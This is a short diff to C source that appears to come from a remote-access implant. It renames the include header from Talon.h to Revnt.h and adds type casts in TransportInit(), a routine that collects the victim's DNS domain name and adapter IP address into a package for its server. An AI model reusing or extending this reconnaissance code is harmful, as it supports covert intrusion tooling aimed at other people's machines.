@@ -1,4 +1,4 @@
-#include <Talon.h>
+#include <Revnt.h>
 
 #include <Transport.h>
 #include <Command.h>
@@ -70,10 +70,10 @@ BOOL TransportInit( )
     DATA_FREE( Data, Length );
 
     // Get Domain
-    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
+    if ( ! GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) )
     {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
+            GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -81,7 +81,7 @@ BOOL TransportInit( )
     GetAdaptersInfo( NULL, &Length );
     if ( ( Adapter = LocalAlloc( LPTR, Length ) ) )
     {
-        if ( GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
+        if (GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR )
         {
             PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
 
